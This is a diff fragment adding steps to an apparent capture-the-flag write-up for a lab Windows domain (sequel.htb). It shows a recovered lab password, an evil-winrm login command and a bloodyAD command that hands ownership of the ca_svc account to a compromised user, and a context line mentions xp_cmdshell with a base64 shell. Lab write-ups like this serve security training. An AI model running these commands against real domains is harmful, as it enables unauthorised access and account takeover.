@@ -148,3 +148,21 @@ xp_cmdshell <Your-base64-shell>
 
 ![image](https://github.com/user-attachments/assets/a5f40969-99e1-424a-8051-cdf84320c5c4)
 
+### Evil-winrm
+
+`ryan`:`WqSZAF6CysDQbGb3`
+
+    evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
+
+Get the user flag!
+
+![image](https://github.com/user-attachments/assets/b08d37e8-7216-4579-986f-872b59c418e6)
+
+### Privelege Escalation 
+
+BloodHound
+
+bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
+
+![image](https://github.com/user-attachments/assets/149fa255-e048-4fc5-89d1-a047916f1414)
+
